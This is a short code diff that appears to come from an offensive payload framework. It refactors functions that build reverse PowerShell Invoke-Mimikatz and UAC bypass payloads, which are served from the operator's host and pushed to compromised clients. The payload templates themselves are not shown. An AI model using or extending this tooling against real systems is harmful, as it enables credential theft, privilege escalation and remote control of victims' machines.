@@ -113,8 +113,8 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     from menu import returnIP
-    moduleport = FUNCTIONS().randomUnusedPort()
-    FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
+    moduleport = randomUnusedPort()
+    DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     powershellScript = payloadchoice % (returnIP(), moduleport)
     clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
@@ -132,8 +132,8 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
 
 def UACBypassGeneration(payloadchoice,payloadname):
     from menu import returnIP
-    moduleport = FUNCTIONS().randomUnusedPort()
-    FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
+    moduleport = randomUnusedPort()
+    DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     encoded = printListener(False, True)
     powershellScript = payloadchoice % (returnIP(), moduleport, encoded)
     clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
